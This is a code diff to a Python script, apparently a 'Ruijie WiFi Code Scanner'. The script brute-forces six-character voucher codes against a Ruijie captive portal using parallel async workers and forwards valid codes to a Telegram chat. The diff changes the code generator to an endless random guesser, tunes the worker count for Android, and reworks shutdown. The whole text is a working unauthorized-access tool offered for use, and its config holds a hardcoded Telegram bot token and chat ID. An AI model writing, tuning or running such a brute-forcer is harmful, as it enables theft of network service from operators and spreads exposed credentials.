@@ -4,7 +4,7 @@ Ruijie WiFi Code Scanner — standalone, no bot framework needed.
 Run: python scan.py
 Found codes are printed to screen AND sent to your Telegram chat.
 """
-import asyncio, aiohttp, re, time, random, string, itertools, sys, os, io
+import asyncio, aiohttp, re, time, random, string, sys, os, io
 
 # ── CONFIG ────────────────────────────────────────────────────────────────────
 BOT_TOKEN  = os.environ.get("BOT_TOKEN",  "8915737207:AAFymbnH_1Ga39WrcoRmfhca73hGhwF4kzY")
@@ -12,7 +12,7 @@ CHAT_ID    = os.environ.get("CHAT_ID",    "5406128711")
 SESSION_URL = os.environ.get("SESSION_URL", "")   # set via env or prompted below
 
 CODE_LEN   = 6          # voucher code length (digits+letters)
-WORKERS    = 8          # parallel workers (lower = more stable on mobile)
+WORKERS    = 4          # parallel workers (keep low on Android to save RAM)
 # ─────────────────────────────────────────────────────────────────────────────
 
 PORTAL = "https://portal-as.ruijienetworks.com"
@@ -152,12 +152,10 @@ async def check_code(session, session_url, code, tg_session):
 
 # ── code generator ────────────────────────────────────────────────────────────
 def code_generator(length=6):
+    """Generate random codes one at a time — uses almost zero RAM."""
     chars = string.digits + string.ascii_uppercase
-    # start random so multiple runs don't repeat
-    pool = list(itertools.product(chars, repeat=length))
-    random.shuffle(pool)
-    for combo in pool:
-        yield ''.join(combo)
+    while True:
+        yield ''.join(random.choices(chars, k=length))
 
 # ── worker ────────────────────────────────────────────────────────────────────
 async def worker(queue, session_url, tg_session):
@@ -215,17 +213,23 @@ async def main():
         progress_task = asyncio.create_task(progress_printer())
 
         gen = code_generator(CODE_LEN)
-        try:
+        stop_event = asyncio.Event()
+
+        async def feeder():
             for code in gen:
+                if stop_event.is_set():
+                    break
                 await queue.put(code)
-        except KeyboardInterrupt:
-            pass
+            for _ in range(WORKERS):
+                await queue.put(None)
 
-        # signal workers to stop
-        for _ in range(WORKERS):
-            await queue.put(None)
+        feed_task = asyncio.create_task(feeder())
+        try:
+            await asyncio.gather(*workers)
+        except (KeyboardInterrupt, asyncio.CancelledError):
+            stop_event.set()
+            feed_task.cancel()
 
-        await queue.join()
         progress_task.cancel()
         await asyncio.gather(*workers, return_exceptions=True)
 
